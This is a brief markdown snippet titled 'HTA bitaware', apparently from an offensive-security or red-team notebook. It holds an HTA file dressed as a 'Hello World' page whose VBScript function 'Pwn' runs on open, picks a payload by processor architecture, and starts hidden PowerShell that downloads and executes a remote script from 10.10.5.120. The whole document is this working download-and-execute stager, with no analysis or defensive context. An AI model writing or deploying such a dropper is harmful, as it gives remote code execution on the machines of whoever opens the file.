# HTA bitaware

```html
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
    
  </body>
  <script language="VBScript">
   Function Pwn()
    Set shell = CreateObject("wscript.Shell")
    If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
	 shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"""
    Else
     shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"""
    End If
	
   End Function

   Pwn
  </script>
</html>
```